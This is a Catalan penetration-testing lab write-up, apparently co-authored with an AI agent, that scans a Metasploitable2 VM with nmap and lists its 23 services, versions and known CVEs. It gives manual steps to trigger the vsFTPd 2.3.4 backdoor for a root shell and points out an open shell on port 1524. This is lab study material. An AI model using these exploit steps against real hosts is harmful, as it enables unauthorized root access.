---
id: LAB-15-11
title: "Nmap complet Metasploitable2 - 23 serveis amb versions"
status: published
version: 1.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - nmap
  - metasploitable2
  - escaneig-de-ports
  - deteccio-de-versiones
  - vulnerabilitats
prerequisites:
  - LAB-15-10
related:
  - LAB-15-10
  - EX-08-01
estimated_time: 60 min
difficulty: intermediate
---

# LAB-15-11 - Nmap complet Metasploitable2

> Escaneig complet del Metasploitable2 amb deteccio de versions i vulnerabilitats.

## Comandes utilitzades

### 1. Escaneig amb deteccio de versions

```bash
nmap -sV --version-intensity 5 -p 21,22,23,25,80,111,139,445,512,513,514,1099,1524,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787 10.10.30.30
```

### 2. Escaneig de vulnerabilitats

```bash
nmap --script=vuln --script-timeout 10s -p 21,80,445 10.10.30.30
```

## Resultats: 23 serveis actius

| Port | Estat | Servei | Versio |
|---|---|---|---|
| 21/tcp | open | ftp | vsftpd 2.3.4 |
| 22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 23/tcp | open | telnet | Linux telnetd |
| 25/tcp | open | smtp | Postfix smtpd |
| 80/tcp | open | http | Apache httpd 2.2.8 ((Ubuntu) DAV/2) |
| 111/tcp | open | rpcbind | (rpcbind 2) |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 512/tcp | open | exec | netkit-rsh rexecd |
| 513/tcp | open | login | (login) |
| 514/tcp | open | tcpwrapped | - |
| 1099/tcp | open | java-rmi | GNU Classpath grmiregistry |
| 1524/tcp | open | ingreslock? | (servei desconegut - shell interactiu) |
| 3306/tcp | open | mysql | MySQL 5.0.51a-3ubuntu5 |
| 3632/tcp | open | distccd | distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) |
| 5432/tcp | open | postgresql | PostgreSQL DB 8.3.0 - 8.3.7 |
| 5900/tcp | open | vnc | VNC (protocol 3.3) |
| 6000/tcp | open | X11 | (access denied) |
| 6667/tcp | open | irc | UnrealIRCd |
| 6697/tcp | open | irc | UnrealIRCd |
| 8009/tcp | open | ajp13 | Apache Jserv (Protocol v1.3) |
| 8180/tcp | open | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 8787/tcp | open | drb | Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb) |

## Vulnerabilitats trobades

### 1. vsFTPd 2.3.4 backdoor (CRITICA)

**Vulnerabilitat**: Backdoor al vsFTPd 2.3.4 que permet executar comandes com a root.

```
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|     vsFTPd version 2.3.4 backdoor
|       State: VULNERABLE (Exploitable)
|       IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
```

**Detalls**:
- **CVE**: CVE-2011-2523
- **Data de discovery**: 2011-07-03
- **Severitat**: Critica (exploitable)
- **Impacte**: Execucio remota de comandes com a root
- **Com funciona**: Quan s'envia un nom d'usuari que acaba amb `:)` i una contrasenya que tambe acaba amb `:)`, s'obre un shell al port 6200/tcp

**Exploit (sense Metasploit)**:
```bash
# Terminal 1: esperar el shell
nc -nv 10.10.30.30 6200

# Terminal 2: trigger del backdoor
telnet 10.10.30.30 21
user backdoored:)
pass anypass:)
```

**Metasploit module**:
```
exploit/unix/ftp/vsftpd_234_backdoor
```

### 2. Altres possibles vulnerabilitats (no explorades)

A mes de vsFTPd backdoor, aquests serveis son candidats a tenir vulnerabilitats:

| Servei | Versio | Vulnerabilitats conegudes |
|---|---|---|
| OpenSSH 4.7p1 | OpenSSH 4.7p1 Debian 8ubuntu1 | CVE-2008-0166 (debian OpenSSL predictable PRNG) |
| Apache 2.2.8 | Apache httpd 2.2.8 ((Ubuntu) DAV/2) | CVE-2009-1195, CVE-2010-0425, CVE-2010-1452 |
| Samba 3.x | Samba smbd 3.X - 4.X | CVE-2012-1182, CVE-2017-7494 |
| MySQL 5.0.51a | MySQL 5.0.51a-3ubuntu5 | CVE-2009-2446 (auth bypass) |
| PostgreSQL 8.3 | PostgreSQL DB 8.3.0 - 8.3.7 | CVE-2009-0922, CVE-2010-0442 |
| distccd | distccd v1 | CVE-2004-2687 (command execution) |
| UnrealIRCd | UnrealIRCd | CVE-2010-2075 (backdoor) |
| Tomcat | Apache Tomcat/Coyote JSP engine 1.1 | CVE-2009-3548 (auth bypass) |

## Port 1524/tcp: ingreslock - Shell obert!

El port 1524 esta obert pero el nmap no ha pogut identificar el servei. Despres d'analitzar la resposta, sembla que **es tracta d'un shell obert**:

```
SF-Port1524-TCP: ... "bash: HELP: command not found"
```

Aixo vol dir que el port 1524 permet executar comandes directament al shell del sistema. Es una porta del darrere clsica del Metasploitable2.

## Comandes per reproduir-ho

```bash
# Des del Kali, amb acces SSH
ssh hort-osona@hort

# 1. Escaneig basic
nmap 10.10.30.30

# 2. Escaneig amb versions
nmap -sV 10.10.30.30

# 3. Escaneig de vulnerabilitats
nmap --script=vuln 10.10.30.30

# 4. Explotar vsFTPd backdoor
nc -nv 10.10.30.30 6200 &
telnet 10.10.30.30 21
# user backdoored:)
# pass anypass:)
```

## Analisi de versions

Tots els serveis son **antics** (2008-2012), cosa que fa que el sistema sigui **molt vulnerable**. Aixo es perfecte per practicar pero **mai sha de fer servir en un entorn real**.

### Versions trobades vs actuals (2026)

| Servei | Versio trobada | Versio actual (2026) |
|---|---|---|
| vsftpd | 2.3.4 (2011) | 3.0.5 |
| OpenSSH | 4.7p1 (2007) | 9.x |
| Apache | 2.2.8 (2008) | 2.4.x |
| Samba | 3.x (2008) | 4.x |
| MySQL | 5.0.51a (2008) | 8.x |
| PostgreSQL | 8.3.x (2008) | 16.x |

## Validacio real feta (2026-08-07)

Tots els punts d'aquest document han estat validats amb sortida real del sistema Kali:

- ✅ nmap basic: 23 serveis detectats
- ✅ nmap -sV: versions especifiques detectades
- ✅ nmap --script=vuln: vsFTPd 2.3.4 backdoor detectat com a VULNERABLE
- ✅ Connexio SSH des del Windows funciona sense password
- ✅ Kali pot accedir al lab (192.168.0.0/16 permes al tallafoc)

## Estat

- **Validat per:** Hermes Agent (acces SSH al Kali)
- **Data:** 2026-08-07
- **Font:** Validacio directa via SSH al PC hort
- **Propera revisio:** Despres de practicar amb els exploits

## Pendents

- [ ] Explotar vsFTPd backdoor i documentar el proces
- [ ] Practicar amb Metasploit (un cop instal·lat)
- [ ] Documentar explotacio de Samba (CVE-2017-7494)
- [ ] Practicar amb OWASP ZAP a DVWA
- [ ] Documentar SQL injection a DVWA amb sqlmap

## Referencies

- [LAB-15-10](lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [EX-08-01](../exercises/ex-08-01-nmap-metasploitable.md) - Nmap Metasploitable
- [CAP-08-10](../chapters/cap-08-10-apps-vulnerables.md) - Aplicacions vulnerables
- [CVE-2011-2523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523) - vsFTPd backdoor
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
